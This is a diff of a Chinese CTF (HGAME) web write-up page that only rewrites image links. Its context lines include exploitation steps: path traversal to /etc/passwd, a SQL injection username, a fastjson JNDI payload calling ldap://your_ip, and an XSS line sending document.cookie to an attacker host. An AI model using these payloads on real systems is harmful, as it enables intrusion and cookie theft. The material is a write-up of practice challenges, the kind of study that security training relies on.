@@ -344,8 +344,7 @@ Answer 30 questions correctly in a row during 40 seconds(The calculation result 
 <p>首先 1-10 关需要带一些普通请求头访问，否则第十关会直接返回<code>shutdown</code>命令，我没有用管理员直接跑，所以没关机，但是我误以为这是要求<code>python</code>返回值的问题，然后搞了半天发现是需要带一些请求头</p>
 <p>然后在 11 关他会修改一个字体的 style ，比如我得到文本为<code>(972279097)/414696815/(472238406)+769794962*(27940524)=?</code>，但是视觉效果却是</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009851.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009851.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009851.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009851.jpg loading=lazy>
 </a>
 </figure></p>
 <p>字体 style 为</p>
@@ -439,8 +438,7 @@ hint2: 图片目录不在 web 目录下</p>
 </blockquote>
 <p>输入答案 2 之后，进入下一题，发现是个计算&mldr;</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005634.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005634.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005634.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005634.jpg loading=lazy>
 </a>
 </figure></p>
 <p>我直接放在一旁跑 1-999，然后继续看题，查看源码我们可以发现</p>
@@ -460,15 +458,13 @@ hint2: 图片目录不在 web 目录下</p>
 
 </code></pre></div><p>图片文件有些怪异，竟然是个<code>.php</code>后缀，尝试看看文件，发现报错</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009022.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009022.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009022.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009022.jpg loading=lazy>
 </a>
 </figure></p>
 <p>看来是个<code>base64</code>加密的图片名字格式，<code>atob("cXVlc3Rpb24ucG5n")</code>得到<code>question.png</code></p>
 <p>尝试用<code>/img/answer.png.php</code>访问，换了一种报错</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg loading=lazy>
 </a>
 </figure></p>
 <p>猜测是个可以任意文件读取，然后我们用<code>../../../../../etc/passwd</code>经过 base64 编码后加上<code>.php</code>访问，成功得到文件内容，于是猜解目录结构，发现经过<code>../../</code>之后就是根目录。</p>
@@ -514,8 +510,7 @@ hint2: 图片目录不在 web 目录下</p>
 <span class=nt>&lt;/beans&gt;</span>
 </code></pre></div><p>但是文件内容对我们接下来要读取的源码并没什么帮助，于是找了很多其他的配置文件都没有找到，最后想起来报错页面应该会有项目文件的名字，也就是之前的那张图：</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg loading=lazy>
 </a>
 </figure></p>
 <p>我们可以看到包名<code>hgame.controller</code>，然后<code>MathController</code>就是控制器，对应的就是<code>.class</code>文件，<code>image()</code>对应的就是<code>MathController</code>这个类中的方法。这样从包名我们就可以找到文件路径了，猜测就是<code>hgame/controller/MathController.class</code>，因为是编译好的，所以是<code>.class</code>结尾，而不是<code>.java</code></p>
@@ -1151,14 +1146,12 @@ echo &quot;&lt;script src='/js/user.js'&gt;&lt;/script&gt;&quot;;
 {% endraw %}
 两个返回均相同</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005995.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005995.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005995.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005995.jpg loading=lazy>
 </a>
 </figure></p>
 <p>发现是<code>()</code>被过滤了</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001230.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001230.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001230.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001230.jpg loading=lazy>
 </a>
 </figure></p>
 <p>一直想着去用文件读取<code>secret_key</code>，但是又因为<code>()</code>被过滤，怎么也做不出来</p>
@@ -1175,8 +1168,7 @@ python2 session_cookie_manager.py decode -c &#39;.eJwljztqQzEQAO-i2sXuSlpJvsxjv8
 
 {u&#39;csrf_token&#39;: u&#39;1acb6e2d00a7f28bbdfc4d531529b336ca4240b5&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;1&#39;, u&#39;_id&#39;: u&#39;f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a&#39;}
 </code></pre></div><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008065.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008065.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008065.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008065.jpg loading=lazy>
 </a>
 </figure></p>
 <h4 id=happyphp>happyPHP</h4>
@@ -1217,8 +1209,7 @@ python2 session_cookie_manager.py decode -c &#39;.eJwljztqQzEQAO-i2sXuSlpJvsxjv8
 <span class=nx>Route</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;/logout&#39;</span><span class=p>,</span> <span class=s1>&#39;SessionsController@destroy&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>(</span><span class=s1>&#39;logout&#39;</span><span class=p>);</span>
 </code></pre></div><p>所以我们还是需要登录管理员账号去获取 flag，而且这里的注入点是<code>name</code>，邮箱唯一，所以我们可以注册一个<code>name=admin' or 1=1;#</code>的账户测试注入</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009312.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009312.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009312.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009312.jpg loading=lazy>
 </a>
 </figure></p>
 <p>所以用</p>
@@ -1267,8 +1258,7 @@ base64_decode 得到
 <span class=k>echo</span> <span class=nx>decode</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span><span class=nv>$key</span><span class=p>);</span>
 </code></pre></div><p>把相关参数填上，得到密码 9pqfPIer0Ir9UUfR，登录<code>admin@hgame.com</code>得到 flag</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004720.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004720.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004720.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004720.jpg loading=lazy>
 </a>
 </figure></p>
 <p>这里一开始以为自己破解密码的思路不太对，而且自己之前也没有关注到 commit 找到<code>$key</code>。还是主要是找脚本不太好找，我尝试了很多个脚本都没有成功解密。后来经过师傅提点才知道确实可以密码破解，就去各种找密码了才搞定。</p>
@@ -1279,14 +1269,12 @@ hint: spring-boot-actuator</p>
 <p>http://119.28.26.122:23333/index</p>
 </blockquote>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002409.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002409.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002409.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002409.jpg loading=lazy>
 </a>
 </figure></p>
 <p>题目设置很简单，目录什么的不存在的，直接访问<code>/hgame_flag</code>直接返回与其他页面一样的 404 不存在的错误</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002505.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002505.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002505.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002505.jpg loading=lazy>
 </a>
 </figure></p>
 <p>看了一下<a class=link href=https://www.freebuf.com/news/193509.html target=_blank rel=noopener>Springboot 之 actuator 配置不当的漏洞利用</a>，以及<a class=link href=https://my.oschina.net/iyinghui/blog/1835220 target=_blank rel=noopener>spring boot 2 使用 actuator 404 的问题</a>遍历了敏感路径都是 404 ……1.x 和 2.x 路径都试过了&mldr;没啥想法</p>
@@ -1371,21 +1359,18 @@ emmmmmmm, something went wrong: Label has two-byte char: ⓵⓶⓻
 <p>首先了解一波<a class=link href=http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/ target=_blank rel=noopener>关于 DNS-rebinding 的总结</a>，可以发现有个比较方便的方法，就是设置两个 A 记录，一个指向 127.0.0.1，另外一个指向不是 127.0.0.1 的地址即可。</p>
 <p>这里原文解释的不是很清楚，又请教了一下白师傅，才明白两个记录怎么绕过对 127.0.0.1 的检测的。首先第一次 DNS 解析在 waf 处，检查 DNS 记录是否是 127.0.0.1 ，第二次 DNS 解析在 ajax 或者请求我们传入的 url 地址的时候进行的，因为 DNS 随机解析，所以如果第一次解析，解析到了我们设置的非 127.0.0.1 的地址，就可以绕过 waf 对 127.0.0.1 的检测，否则解析到 127.0.0.1 就直接被 waf ，所以第一次通过的概率为 1/2 ；如果第二次解析，也就是在对 url 进行请求的时候，解析到了 127.0.0.1 的话，这次 ssrf 就算成功了，也就达到了我们访问内网地址的目的，如果解析不是 127.0.0.1 的话，那就失败了，所以第二次成功概率也是 1/2 。综述，整个<code>DNS Rebinding</code>采用两个<code>A</code>记录绕过的成功概率为 1/2 。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009642.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009642.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009642.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009642.jpg loading=lazy>
 </a>
 </figure></p>
 <p>可以看到这里已经成功了。</p>
 <p>传入<code>data</code>参数，因为作为<code>/secret_flag</code>的参数，这里注意要用<code>urlencode</code>，看到返回<code>WoW! Convert JSON to object...OK!&lt;br>Result: 1</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009810.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009810.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009810.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009810.jpg loading=lazy>
 </a>
 </figure></p>
 <p>可以使用<code>fastjson</code>反序列化搞定，但是使用<code>vulhub</code>下的<code>fastjson</code>的 exp 直接就报了 waf</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004231.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004231.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004231.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004231.jpg loading=lazy>
 </a>
 </figure></p>
 <p>参考<a class=link href=https://www.restran.net/2018/10/29/fastjson-rce-notes/#%E5%9F%BA%E4%BA%8E-JNDI-%E7%9A%84-PoC target=_blank rel=noopener>FastJson 反序列化漏洞利用笔记#基于 JNDI 的 PoC</a>，构造如下的<code>Exploit.java</code>，然后编译成<code>.class</code>文件放在 HTTP 服务端口下提供后续下载</p>
@@ -1408,13 +1393,11 @@ emmmmmmm, something went wrong: Label has two-byte char: ⓵⓶⓻
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=p>{</span><span class=nt>&#34;@type&#34;</span><span class=p>:</span><span class=s2>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class=p>,</span><span class=nt>&#34;dataSourceName&#34;</span><span class=p>:</span><span class=s2>&#34;ldap://your_ip:1389/Exploit&#34;</span><span class=p>,</span><span class=nt>&#34;autoCommit&#34;</span><span class=p>:</span><span class=kc>true</span><span class=p>}</span>
 </code></pre></div><p>记得二次 urlencode ，成功<code>getshell</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002294.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002294.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002294.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002294.jpg loading=lazy>
 </a>
 </figure></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003389.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003389.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003389.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003389.jpg loading=lazy>
 </a>
 </figure></p>
 <h4 id=happygo>happyGo</h4>
@@ -1427,14 +1410,12 @@ emmmmmmm, something went wrong: Label has two-byte char: ⓵⓶⓻
 <p>复现题 2333……orz</p>
 <p>题目提供注册登录功能，登录进来后可以发送消息</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008211.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008211.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008211.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008211.jpg loading=lazy>
 </a>
 </figure></p>
 <p>也可以修改自己的头像</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005282.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005282.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005282.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005282.jpg loading=lazy>
 </a>
 </figure></p>
 <p>发现源码有地方</p>
@@ -1689,8 +1670,7 @@ emmmmmmm, something went wrong: Label has two-byte char: ⓵⓶⓻
 <span class=nb>print</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;[+] login &#34;</span><span class=o>+</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
 </code></pre></div><p>读取 flag</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004373.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004373.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004373.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004373.jpg loading=lazy>
 </a>
 </figure></p>
 <h4 id=happyxss>HappyXSS</h4>
@@ -1733,8 +1713,7 @@ onerror
 </code></pre></div><p>base64 内容：</p>
 <pre tabindex=0><code class=language-script data-lang=script>window.location=&quot;http://your_ip:port?c=&quot;+document.cookie;
 </code></pre><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002591.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002591.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002591.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002591.jpg loading=lazy>
 </a>
 </figure></p>
 <p>再给几个其他师傅绕过的 payload :</p>
